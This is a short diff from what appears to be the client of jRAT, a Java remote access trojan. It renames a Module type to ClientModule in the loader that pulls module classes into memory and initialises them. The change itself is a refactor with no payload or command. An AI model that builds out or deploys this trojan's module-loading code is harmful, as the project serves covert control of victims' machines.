@@ -1,6 +1,6 @@
 package jrat.client.modules;
 
-import jrat.api.Module;
+import jrat.api.ClientModule;
 import jrat.client.Connection;
 import jrat.client.Main;
 import jrat.client.MemoryClassLoader;
@@ -45,9 +45,9 @@ public class ModuleLoader {
             }
 
             // load the main class
-            Class<Module> clazz = (Class<Module>) l.loadClass(mainClass);
+            Class<ClientModule> clazz = (Class<ClientModule>) l.loadClass(mainClass);
 
-            Module module = clazz.newInstance();
+            ClientModule module = clazz.newInstance();
 
             try {
                 module.init();
